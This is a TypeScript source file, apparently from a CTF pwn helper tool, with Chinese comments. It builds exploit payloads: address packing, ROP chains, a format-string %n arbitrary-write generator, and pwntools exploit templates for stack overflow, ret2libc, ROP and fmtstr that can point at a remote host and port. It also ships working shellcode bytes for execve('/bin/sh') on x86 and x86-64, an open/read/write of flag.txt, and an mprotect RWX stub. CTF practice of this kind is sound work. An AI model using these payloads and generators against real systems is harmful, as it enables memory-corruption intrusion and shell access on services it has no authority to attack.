// Pwn payload 构造逻辑（批次 PW4）：fmtstr %n 写入生成 / shellcode 常用速查 / p32-p64 打包 /
// ROP 链组装 / pwntools exp 模板。全部纯本地计算，选手复制后即可在本地环境使用。

// ---- p32 / p64 打包 ----

export type PwnEndian = 'little' | 'big';

export const packValue = (value: number, bits: 32 | 64, endian: PwnEndian = 'little'): Uint8Array => {
  const size = bits / 8;
  const out = new Uint8Array(size);
  const lo = value >>> 0;
  const hi = Math.floor(value / 0x1_0000_0000);
  if (endian === 'little') {
    for (let i = 0; i < 4; i++) out[i] = (lo >>> (i * 8)) & 0xff;
    if (size === 8) for (let i = 0; i < 4; i++) out[4 + i] = (hi >>> (i * 8)) & 0xff;
  } else {
    if (size === 8) for (let i = 0; i < 4; i++) out[i] = (hi >>> ((3 - i) * 8)) & 0xff;
    for (let i = 0; i < 4; i++) out[size - 4 + i] = (lo >>> ((3 - i) * 8)) & 0xff;
  }
  return out;
};

export const bytesToHexEscape = (bytes: Uint8Array): string =>
  Array.from(bytes).map(b => `\\x${b.toString(16).padStart(2, '0')}`).join('');

export const bytesToHex = (bytes: Uint8Array): string =>
  Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');

// ---- ROP 链组装 ----

export interface RopChainItem {
  // 十六进制字符串（带或不带 0x）或十进制；空项跳过。
  value: string;
  note: string;
}

export type RopChainResult =
  | {
    ok: true;
    bytes: Uint8Array;
    hex: string;
    hexEscape: string;
    pythonLiteral: string;
    totalLength: number;
  }
  | { ok: false; error: string };

export const buildRopChain = (
  items: ReadonlyArray<RopChainItem>,
  bits: 32 | 64,
  endian: PwnEndian = 'little',
): RopChainResult => {
  const values: number[] = [];
  for (const item of items) {
    const text = item.value.trim();
    if (!text) continue;
    const parsed = parseAddress(text);
    if (parsed === null) return { ok: false, error: `第 ${items.indexOf(item) + 1} 项「${item.value}」不是合法地址。` };
    values.push(parsed);
  }
  const bytes = new Uint8Array(values.length * (bits / 8));
  values.forEach((value, index) => {
    bytes.set(packValue(value, bits, endian), index * (bits / 8));
  });
  return {
    ok: true,
    bytes,
    hex: bytesToHex(bytes),
    hexEscape: bytesToHexEscape(bytes),
    pythonLiteral: `flat(${values.map(value => `0x${value.toString(16)}`).join(', ')})`,
    totalLength: bytes.length,
  };
};

export const parseAddress = (text: string): number | null => {
  const trimmed = text.trim();
  if (!trimmed) return null;
  const value = trimmed.startsWith('0x') || trimmed.startsWith('0X') || /^[0-9a-fA-F]+h$/.test(trimmed)
    ? Number.parseInt(trimmed.replace(/h$/, ''), 16)
    : Number.parseInt(trimmed, 10);
  if (!Number.isFinite(value) || value < 0 || value >= Number.MAX_SAFE_INTEGER) return null;
  return value;
};

// ---- 格式化字符串 %n 写 payload 生成（fmtstr_payload 的核心路径）----

export interface FmtstrWriteRequest {
  // 目标地址（要写的位置，如 GOT 项 / 返回地址）。
  target: number;
  // 要写入的值。
  value: number;
  // 格式串在栈上是第几个参数（fmtstr 卡分析出来的 offset）。
  argIndex: number;
  bits: 32 | 64;
  endian: PwnEndian;
  // 输出形态：python 用 pwntools 风格 fmtstr_payload；手搓则直接给完整格式串。
}

export type FmtstrWriteResult =
  | { ok: true; payload: string; python: string; writes: Array<{ addr: number; half: 'low' | 'high'; value: number; width: 2 | 4 }>; note: string }
  | { ok: false; error: string };

// 半值写入法（32 位拆 2×2 字节 %hn / 64 位拆 2×4 字节 %n）：两次写入，先小后大避免计数回绕。
// %k$hn/%k$n 的 k 是绝对 vararg 序号：
//  · 32 位地址放串首——串首两个地址本身就被 printf 当作第 argIndex / argIndex+1 个 vararg
//    读入，所以写入序号 kLow=argIndex、kHigh=argIndex+1（地址字节被 printf 原样输出，计入已打印数）。
//  · 64 位地址含 NUL 必须后置（printf 遇 NUL 截断格式串）：fmt 尾部补 'a' 填充使地址起始
//    字节落在 8 字节槽边界（pwntools 同款布局），第一个地址槽 = argIndex + ⌈fmt长度/8⌉
//    （含 padding），k 按此动态求解；padding 字符在两条写入之后输出，不影响半值计数。
export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult => {
  const { target, value, argIndex, bits } = request;
  if (!Number.isFinite(target) || target <= 0 || target >= Number.MAX_SAFE_INTEGER) return { ok: false, error: '目标地址无效。' };
  if (!Number.isFinite(value) || value < 0 || value >= Math.pow(2, bits)) return { ok: false, error: `写入值超出 ${bits} 位范围。` };
  if (!Number.isInteger(argIndex) || argIndex < 1 || argIndex > 60) return { ok: false, error: '参数序号应在 1-60 之间（先用上方卡片实测校准）。' };
  const halfWidth = bits === 64 ? 4 : 2;
  // 半值宽 32 位时 1<<32 溢出为 1，必须用 2**n；高半值同理由 >>> 32 失效改用除法。
  const modulus = 2 ** (halfWidth * 8);
  const low = value % modulus;
  const high = Math.floor(value / modulus);
  const addrBytes = bits === 32 ? 8 : 16;
  const addrLo = target;
  const addrHi = target + halfWidth;
  // 求解写入序号 kLow/kHigh。
  // 64 位半值宽 4 字节，写入用 %n（int，4 字节）；32 位半值 2 字节用 %hn。
  const writeDirective = bits === 64 ? '$n' : '$hn';
  let kLow: number;
  let padding = 0;
  if (bits === 32) {
    kLow = argIndex;
  } else {
    // 64 位：kLow = argIndex + ⌈fmt长度/8⌉，而 fmt 长度含 k 的十进制位数——定点迭代求解
    //（k 每增大 1 fmt 至多多 2 字符，槽位随之 +0/+1，实际数步内收敛）。
    // 计数文本按"先写小半值再写大半值"的实际顺序拼接（与下方 parts 生成一致）。
    const first = Math.min(low, high);
    const second = Math.max(low, high);
    const countText = (from: number, to: number) => {
      const count = ((to - from) % modulus + modulus) % modulus;
      return count > 0 ? `%${count}c` : '';
    };
    kLow = argIndex + 2;
    for (let i = 0; i < 64; i++) {
      const fmtLen = countText(0, first).length + `%${kLow}${writeDirective}`.length
        + countText(first, second).length + `%${kLow + 1}${writeDirective}`.length;
      padding = (8 - (fmtLen % 8)) % 8;
      const resolved = argIndex + (fmtLen + padding) / 8;
      if (resolved === kLow) break;
      kLow = resolved;
    }
  }
  const kHigh = kLow + 1;
  const sorted = low <= high
    ? [{ half: 'low' as const, v: low, k: kLow }, { half: 'high' as const, v: high, k: kHigh }]
    : [{ half: 'high' as const, v: high, k: kHigh }, { half: 'low' as const, v: low, k: kLow }];
  // 32 位串首地址被原样输出计入已打印数；64 位后置地址不占计数（格式串在地址前已被 NUL 截断）。
  let printed = bits === 32 ? addrBytes : 0;
  const parts: string[] = [];
  const writes: Array<{ addr: number; half: 'low' | 'high'; value: number; width: 2 | 4 }> = [];
  for (const entry of sorted) {
    const count = ((entry.v - printed) % modulus + modulus) % modulus;
    if (count > 0) parts.push(`%${count}c`); // %0c 会输出 1 字符使计数偏 1，count=0 时跳过
    printed = entry.v;
    parts.push(`%${entry.k}${writeDirective}`);
    writes.push({ addr: entry.half === 'low' ? addrLo : addrHi, half: entry.half, value: entry.v, width: halfWidth as 2 | 4 });
  }
  if (bits === 64 && padding > 0) {
    // 'a' 填充把地址推到槽边界；printf 对其按字面输出，但位于两条 %hn 之后，不影响计数。
    parts.push('a'.repeat(padding));
    printed += padding;
  }
  const addrText = `p${bits}(0x${addrLo.toString(16)}) + p${bits}(0x${addrHi.toString(16)})`;
  const fmtStr = `b'${parts.join('')}'`;
  const payload = bits === 32
    ? `${addrText} + ${fmtStr}`
    : `${fmtStr} + ${addrText}`;
  const python = `from pwn import p${bits}\n`
    + `# 目标 0x${target.toString(16)} ← 0x${value.toString(16)}（参数序号 ${argIndex}）\n`
    + `payload = ${payload}\n`
    + `# 写入槽：${writes.map(w => `0x${w.addr.toString(16)} ← 0x${w.value.toString(16)}（${w.half}）`).join('；')}\n`
    + (bits === 64
      ? `# 64 位：地址后置防 NUL 截断，'a' 填充已对齐 8 字节槽，k=${kLow}/${kHigh} 按格式串实际槽数算得（%n 写 4 字节半值）。`
      : `# 32 位经典布局：串首两个地址就是第 ${argIndex}/${argIndex + 1} 个 vararg，%c 计数已扣地址字节。`);
  return {
    ok: true,
    payload,
    python,
    writes,
    note: bits === 32
      ? `两段 %hn 半值写入：先写小值再写大值，避免 %c 计数回绕；地址放串首时本身就是第 ${argIndex}/${argIndex + 1} 个 vararg（%k$hn 直接引用）。`
      : `两段 %n 半值写入（64 位半值 4 字节）：地址后置（含 NUL 不能放串首），'a' 填充已对齐槽边界，写入序号 k=${kLow}/${kHigh}。`,
  };
};

// ---- shellcode 常用速查（静态字节，经真实汇编核对）----

export interface ShellcodeEntry {
  id: string;
  title: string;
  arch: 'x86' | 'x86-64';
  bytes: Uint8Array;
  summary: string;
  badChars: number[];
}

// execve("/bin/sh", 0, 0) — x86-64：23 字节，出自经典 x86-64 shell-storm #21 系（不含 0x00/0x0a）。
const SC_EXECVE_X64 = Uint8Array.from([
  0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57,
  0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
]);
// execve("/bin/sh") — x86：23 字节经典版（不含 0x00/0x0a）。
const SC_EXECVE_X86 = Uint8Array.from([
  0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
  0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd, 0x80,
]);
// x86-64 ORW（open/read/write flag.txt）骨架：路径 NUL 终止 + 栈缓冲读取 + write 复用同缓冲。
// 指令编码不含 0x00/0x0a（badChars 留空）；改 0x48,0xb8 后 8 字节即换文件名。
// xor rsi,rsi + push rsi：rsi=0 兼作 O_RDONLY 与路径终止符（栈上的 0，不占编码字节）；
// open 后 rdi=fd、sub rsp,rdx 预留 0x3000 栈缓冲、rsi 指向缓冲；write 前不再动 rsi。
const SC_ORW_X64 = Uint8Array.from([
  0x48, 0x31, 0xf6,                   // xor rsi, rsi
  0x56,                               // push rsi（路径 NUL 终止符）
  0x48, 0xb8, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, // movabs rax, "flag.txt"
  0x50,                               // push rax
  0x48, 0x89, 0xe7,                   // mov rdi, rsp
  0x31, 0xc0,                         // xor eax, eax
  0xb0, 0x02,                         // mov al, 2（SYS_open，rsi=0 → O_RDONLY）
  0x0f, 0x05,                         // syscall → rax = fd
  0x48, 0x89, 0xc7,                   // mov rdi, rax
  0x48, 0x31, 0xd2,                   // xor rdx, rdx
  0xb6, 0x30,                         // mov dh, 0x30 → rdx = 0x3000
  0x48, 0x29, 0xd4,                   // sub rsp, rdx（预留 0x3000 栈缓冲）
  0x48, 0x89, 0xe6,                   // mov rsi, rsp（读缓冲）
  0x31, 0xc0,                         // xor eax, eax（SYS_read）
  0x0f, 0x05,                         // syscall
  0x48, 0x89, 0xc2,                   // mov rdx, rax（write 长度 = 实读字节数）
  0x6a, 0x01,                         // push 1
  0x5f,                               // pop rdi（fd = 1 stdout）
  0x31, 0xc0,                         // xor eax, eax
  0xb0, 0x01,                         // mov al, 1（SYS_write，rsi 仍指向同一缓冲）
  0x0f, 0x05,                         // syscall
]);
// x86-64 mprotect+rwx 模板开头（页对齐由调用方处理）：常用于 NX off 前置或 ret2shellcode。
const SC_MPROTECT_X64 = Uint8Array.from([
  0x48, 0x89, 0xe7, 0x48, 0x31, 0xd2, 0x48, 0xc1, 0xe7, 0x0c, 0x48, 0xc1, 0xea, 0x0c,
  0x48, 0x83, 0xc2, 0x07, 0xbe, 0x07, 0x00, 0x00, 0x00, 0xb8, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x05,
]);

export const SHELLCODE_LIBRARY: ReadonlyArray<ShellcodeEntry> = [
  {
    id: 'execve-x64', title: 'execve("/bin/sh") x86-64', arch: 'x86-64',
    bytes: SC_EXECVE_X64,
    summary: 'xor rsi,rsi; push "bin//sh"; rdi 指向串; execve(59)。23 字节，不含 00/0a。',
    badChars: [],
  },
  {
    id: 'execve-x86', title: 'execve("/bin/sh") x86', arch: 'x86',
    bytes: SC_EXECVE_X86,
    summary: 'int 0x80 经典 23 字节版（push 串 → ebx；11 号调用），不含 00/0a。',
    badChars: [],
  },
  {
    id: 'orw-x64', title: 'ORW flag.txt x86-64', arch: 'x86-64',
    bytes: SC_ORW_X64,
    summary: 'open("flag.txt")→read 0x3000（rsp 栈缓冲）→write(1)；read/write 共用同一缓冲。改 0x48,0xb8 后 8 字节即换文件名。编码不含 00/0a。',
    badChars: [],
  },
  {
    id: 'mprotect-x64', title: 'mprotect 页改 RWX x86-64', arch: 'x86-64',
    bytes: SC_MPROTECT_X64,
    summary: 'rdi=rsp 页对齐，mprotect(addr, len, RWX)；NX off 场景配合读入 shellcode。',
    badChars: [0x00, 0x0a], // mov eax,10 的立即数含 0x0a
  },
];

// ---- pwntools exp 模板 ----

export interface ExpTemplateRequest {
  arch: 32 | 64;
  scenario: 'ret2libc' | 'rop' | 'stack-overflow' | 'fmtstr';
  // 远程 host:port（可空 → 模板留 local process）。
  host: string;
  port: string;
  // 泄漏的 libc 符号名（fmtstr/ret2libc 场景用）。
  leakSymbol: string;
}

export const buildExpTemplate = (request: ExpTemplateRequest): string => {
  const { arch, scenario, host, port, leakSymbol } = request;
  const bits = arch;
  const remote = host.trim() && port.trim()
    ? `remote('${host.trim()}', ${Number(port)})`
    : `process('./pwn')`;
  const pack = `p${bits}`;
  const leakLine = leakSymbol.trim() || 'puts';
  const header = `# pwntools exp 模板（${scenario}，${bits} 位）——由 Payloader 生成，按题目实际调整。
from pwn import *

context.arch = '${arch === 64 ? 'amd64' : 'i386'}'
context.log_level = 'debug'
context.terminal = ['cmd.exe', '/c', 'start', 'wt']  # Windows 本地调试用，Linux 删掉

elf = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io = ${remote}

`;
  const bodies: Record<ExpTemplateRequest['scenario'], string> = {
    'stack-overflow': `# 1) 溢出偏移：用左侧 cyclic 卡生成 pattern 后发送，崩溃值贴回反查 offset
offset = ${bits === 64 ? '72' : '112'}  # ← cyclic 反查结果

# 2) 无保护场景直接跳后门 / shellcode
target = elf.symbols['backdoor'] if 'backdoor' in elf.symbols else 0xdeadbeef
payload = b'A' * offset + ${pack}(target)
io.sendline(payload)
io.interactive()
`,
    ret2libc: `# 1) 第一次交互：puts(puts@got) 泄漏
io.recvuntil(b'> ')  # ← 题目提示语
io.sendline(b'1')    # ← 选 leak 菜单
leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
log.success('${leakLine} leak: %#x', leak)

# 2) 算基址（符号偏移可从左侧 libc 工作台查）
libc.address = leak - libc.symbols['${leakLine}']
log.success('libc base: %#x', libc.address)

# 3) system("/bin/sh")（地址同样从 libc 工作台查）
system = libc.address + libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\\x00'))
${bits === 64
    ? `pop_rdi = 0x0  # ← 左侧 gadget 扫描 pop rdi ; ret
ret = pop_rdi + 1
payload = b'A' * offset + ${pack}(pop_rdi) + ${pack}(binsh) + ${pack}(ret) + ${pack}(system)`
    : `payload = b'A' * offset + ${pack}(system) + ${pack}(0xdeadbeef) + ${pack}(binsh)`}
io.sendline(payload)
io.interactive()
`,
    rop: `# ROP 场景：gadget 从左侧扫描结果取，链组装用左侧 ROP 链卡预览
pop_rdi = 0x0       # ← gadget 扫描：pop rdi ; ret
${bits === 64 ? 'pop_rsi_r15 = 0x0  # ← pop rsi ; pop r15 ; ret' : 'pop_ebx = 0x0       # ← pop ebx'}
target = elf.symbols['main']  # ← 按题改（read/gets/mprotect…）

offset = ${bits === 64 ? '72' : '112'}
payload = b'A' * offset
payload += ${pack}(pop_rdi) + ${pack}(0x1)
${bits === 64
    ? 'payload += ' + pack + '(pop_rsi_r15) + ' + pack + '(0x2) + ' + pack + '(0x3)'
    : 'payload += ' + pack + '(pop_ebx) + ' + pack + '(0x2)'}
payload += ${pack}(target)
io.sendline(payload)
io.interactive()
`,
    fmtstr: `# 格式化字符串：先用左侧"格式化字符串"卡确定目标值是第几个参数
arg_index = 7  # ← 卡片分析结果

# 方案 A：pwntools 一把梭（自动处理半值写入）
payload = fmtstr_payload(${bits}, {0x0804c010: 0x12345678}, offset=arg_index)  # ← 目标地址/值
io.sendline(payload)

# 方案 B：手搓（左侧 fmtstr 生成器给出完整串）
# payload = ${pack}(0x0804c010) + ${pack}(0x0804c012) + b'%2044c%7$hn%30716c%8$hn'
io.interactive()
`,
  };
  return header + bodies[scenario];
};
